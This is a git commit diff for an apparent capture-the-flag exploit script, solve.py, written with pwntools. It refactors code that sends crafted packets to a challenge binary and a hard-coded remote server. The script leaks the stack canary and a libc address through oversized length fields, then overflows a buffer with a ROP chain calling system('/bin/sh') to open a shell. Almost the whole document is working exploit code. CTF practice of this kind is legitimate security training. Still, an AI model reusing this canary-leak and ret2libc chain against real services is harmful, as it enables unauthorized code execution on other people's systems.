e33c94f4bf8bb3810f4b4b29420095e4e72a3cad
Saitomu <dung9126lol@gmail.com>
2026-04-30 12:44:32 +0700

    Update solve.py

--- event/t3mp/public/solve.py
+++ event/t3mp/public/solve.py
@@ -2,6 +2,7 @@
 
 from pwn import *
 from pack import *
+import socket
 context.terminal = ["foot", "-e", "sh", "-c"]
 
 exe = ELF('main_patched', checksec=False)
@@ -29,191 +30,137 @@ def GDB():
         # b*main+790
         b*0x4025AA 
         b*0x0402692   
+        b*0x040268B 
         c
         ''')
         sleep(1)
 
 #  nc 67.223.119.69 3637 
-if args.REMOTE:
-    p = remote('67.223.119.69', 3637)
-    # p = remote('0', 1338)
-else:
-    p = process([exe.path])
+# if args.REMOTE:
+#     p = remote('67.223.119.69', 3637)
+#     # p = remote('0', 1338)
+# else:
+#     p = process([exe.path])
 NUMBER = 0
 KEY    = 1
 BIN    = 2
 SIGNAL = 3
-GDB()
-"""
-canary: 0x3009
-"""
-load  = [
-{
-    'type': NUMBER,
-    'value': 0x29
-},
-{
-    'type':  BIN,
-    'data': b'\0'*0x36
-}
-]
-packet = create_packet(0x1337, pack_data(load))
 
-sa(b'> ', packet)
+def choice_0x1337(num, data):
+    load  = [
+    {
+        'type': NUMBER,
+        'value': num
+    },
+    {
+        'type':  BIN,
+        'data': data
+    }
+    ]
+    packet = create_packet(0x1337, pack_data(load))
+    sa(b'> ' ,create_packet(0x100, b'\0') )
 
-load  = [
-{
-    'type': NUMBER,
-    'value': 0xffff
-},
-{
-    'type': BIN,
-    'data': b'w'*(0x2fe0)
-    # 'data': b'w'*(0x7ff)
+    s(packet)
+    info(f'len: {hex(len(packet))}')
 
-}
-]
-packet = create_packet(0x1337, pack_data(load))
-sa(b'> ', packet)
-# input("next?")
+def choice_0xdead(data):
+    load  = [
+    {
+        'type': BIN,
+        'data': data
+    }
+    ]
+    packet = create_packet(0xdead, pack_data(load))
+    sa(b'> ' ,create_packet(0x100, b'\0') )
 
-load  = [
-{
-    'type': BIN,
-    'data': b'f'*0x29
-}
-]
-packet = create_packet(0xdead, pack_data(load))
+    sa(b'> ', packet)
 
-sa(b'> ', packet)
+    info(f'len: {hex(len(packet))}')
+
+def show():
+    packet = create_packet(0x700, p8(0))
+    sa(b'> ' ,create_packet(0x100, b'\0') )
+
+    sa(b'> ', packet)
 
 
-packet = create_packet(0x700, p8(0))
 
-sa(b'> ', packet)
-
-info(f'start leak canary')
-
-a = p.recvuntil(b'No data available !', drop=True)
-info(f'---------------------------------------------------------')
-print(a)
-canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
-info(f'canary: {hex(canary)}')
-
-load  = [
-{
-    'type': NUMBER,
-    'value': 0x38
-},
-{
-    'type': BIN,
-    'data': b'\0'*(0x36)
-
-}
-]
-packet = create_packet(0x1337, pack_data(load))
+# choice_0x1337(0xfffff, b'a'*(0xee0))
+# show()
 
 
-sa(b'> ', packet)
+# GDB()
+def flag():
+    
+    """
+    canary: 0x3009
+    """
+   
+    choice_0x1337(0x29, b'\0')
+    
+    choice_0x1337(0xffff,  b'w'*(0x2fe0))
 
-load  = [
-{
-    'type': NUMBER,
-    'value': 0xfffff
-},
-{
-    'type': BIN,
-    'data': b'w'*(0x2fe0)
-
-}
-]
-packet = create_packet(0x1337, pack_data(load))
-
-sa(b'> ', packet)
-
-load  = [
-{
-    'type': BIN,
-    'data': b'f'*0x38
-}
-]
-packet = create_packet(0xdead, pack_data(load))
-
-sa(b'> ', packet)
-
-packet = create_packet(0x700, b'\0')
-
-sa(b'> ', packet)
-
-info(f'-'*0x10)
-info(f'leak libc')
-a = p.recvuntil(b'No data available !', drop=True)
-info(f'---------------------------------------------------------')
-print(a)
-libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
-libc.address = libc_leak - 0x29d90
-info(f'libc leak: {hex(libc_leak)}')
-info(f'libc base: {hex(libc.address)}')
-
-load  = [
-{
-    'type': NUMBER,
-    'value': 0x100
-},
-{
-    'type': BIN,
-    'data': b'\0'
-
-}
-]
-packet = create_packet(0x1337, pack_data(load))
+    choice_0xdead(b'f'*0x29)
 
 
-sa(b'> ', packet)
+    show()
 
-load  = [
-{
-    'type': NUMBER,
-    'value': 0xfffff
-},
-{
-    'type': BIN,
-    'data': b'h'*(0x2fe0)
+    info(f'start leak canary')
 
-}
-]
-packet = create_packet(0x1337, pack_data(load))
+    a = p.recvuntil(b'No data available !', drop=True)
+    info(f'---------------------------------------------------------')
+    print(a)
+    canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
+    info(f'canary: {hex(canary)}')
 
-sa(b'> ', packet)
+    
+    choice_0x1337(0x38, b'\0')
 
-pop_rdi  =0x000000000002a3e5 + libc.address
-win = flat(
-    b'a'*0x28,
-    canary,
-    1,
-    pop_rdi+1,
-    pop_rdi,
-    next(libc.search(b'/bin/sh')),
-    libc.sym.system
-)
+    choice_0x1337(0xfffff, b'w'*(0x2fe0))
 
-load  = [
-{
-    'type': BIN,
-    'data': win.ljust(0x100, b'k')
-}
-]
-packet = create_packet(0xdead, pack_data(load))
+    choice_0xdead(b'f'*0x38)
 
-sa(b'> ', packet)
-sa(b'> ', b'1')
-# 0x9da5
+    show()
+
+    info(f'-'*0x10)
+    info(f'leak libc')
+    a = p.recvuntil(b'No data available !', drop=True)
+    info(f'---------------------------------------------------------')
+    print(a)
+    libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
+    libc.address = libc_leak - 0x29d90
+    info(f'libc leak: {hex(libc_leak)}')
+    info(f'libc base: {hex(libc.address)}')
+
+  
+    choice_0x1337(0x100, b'\0')
+
+    choice_0x1337(0xfffff, b'h'*(0x2fe0))
+
+    pop_rdi  =0x000000000002a3e5 + libc.address
+    win = flat(
+        b'a'*0x28,
+        canary,
+        1,
+        pop_rdi+1,
+        pop_rdi,
+        next(libc.search(b'/bin/sh')),
+        libc.sym.system
+    )
+
+    # GDB()
+    choice_0xdead(win)
+
+
+if args.REMOTE:
+    p = remote('67.223.119.69', 3637)
+    # p = remote('0', 1338)
+    p.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+else:
+    p = process([exe.path])
+
+flag()
+sa(b'> ', b'w')
+  
 p.interactive()
-
-"""
-
-typedef struct{
-    int idx;
-
-}
-"""
